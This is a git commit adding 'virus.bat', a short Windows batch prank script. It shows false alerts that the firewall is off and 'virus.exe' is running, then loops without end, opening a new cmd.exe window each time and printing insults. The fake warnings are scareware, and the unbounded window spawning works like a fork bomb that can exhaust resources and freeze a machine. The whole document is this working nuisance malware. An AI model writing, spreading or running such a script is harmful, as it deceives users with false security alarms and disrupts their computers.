029b7b519eb3d792a3e2bae6b36138cb752767fd
GGabbo <94383179+GGabbo@users.noreply.github.com>
2022-05-29 12:27:17 +0200

    Create virus.bat

---
+++ virus.bat
@@ -0,0 +1,19 @@
+@echo off
+echo Critical error. Windows Firewall is not enabled for some problems
+echo You are now exposed to malware
+pause
+msg * "Critical error: windows firewall can't detlete the file: 'virus.exe'"
+msg * "Warning: 'virus.exe' is trying to open a new window"
+:start
+start cmd.exe
+echo you are an idiot!
+echo you are an idiot!
+echo you are an idiot!
+echo you are an idiot!
+echo you are an idiot!
+echo you are an idiot!
+echo you are an idiot!
+echo you are an idiot!
+echo you are an idiot!
+echo you are an idiot!
+goto start
